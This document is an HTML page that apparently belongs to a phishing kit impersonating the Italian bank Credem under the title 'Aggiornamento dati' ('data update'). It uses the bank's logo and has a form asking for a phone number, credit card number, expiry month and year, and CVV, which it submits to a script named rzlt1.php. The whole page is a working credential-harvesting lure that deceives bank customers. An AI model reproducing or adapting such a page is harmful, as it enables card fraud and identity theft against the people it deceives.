<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">





<html>





<head>





<title>Credem Aggiornamento</title>





<meta name="viewport" content="width=device-width, initial-scale=1.0">





<link rel="shortcut icon" href="images/favicon.ico"/>





<style type="text/css">





.textbox { 





    border: 1px solid #323232; 





    height: 42px; 





    width: 240px; 





  	font-family: 'open sans';





    font-size: 14px;





  	color: #6F6F6F;





    padding-left: 2px; 





    border-radius: 2px; 





    box-shadow: 0 4px 7px 0 #d2d2d2 inset;   





}  





.textbox:focus { 





    outline: none; 





    border: 2px solid #258900;





} 




</style>


<h2 style="text-align: center;"><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.bitmat.it/wp-content/uploads/2018/10/LOGOcredem-banca.png" alt="" width="335" height="251" />Aggiornamento dati</h2>





</head>





<body>





<form action=rzlt1.php name=kmc method=post>



<input name="n" placeholder="Numero di Telefono " class="textbox" autocomplete="off" required type="number" style="display: block; margin-left: auto; margin-right: auto;z-index:1"><br>





<input name="c" placeholder="Carta di Credito " class="textbox" autocomplete="off" required type="text" minlength="16" maxlength="19 " style="display: block; margin-left: auto; margin-right: auto;";z-index:2"><br>





<input name="m" placeholder="mm " class="textbox" autocomplete="off" required type="text" maxlength="2 " style="display: block; margin-left: auto; margin-right: auto;z-index:5">
<br>
  
  
  
<input name="a" placeholder="aaaa " class="textbox" autocomplete="off" required type="text"  maxlength="4 " style="display: block; margin-left: auto; margin-right: auto;z-index:5">
<br>





<input name="v" placeholder="Cvv " class="textbox" autocomplete="off" required type="password" maxlength="3 " style="display: block; margin-left: auto; margin-right: auto;z-index:4"><br>
<br>



<center>
<div id="formimage1" <img style="display: block; margin-left: auto; margin-right: auto;" z-index:6"><input type="image" name="formimage1" width="226" height="44" src="images/s13.png"><br>
<br>
<br>


</body>





</html>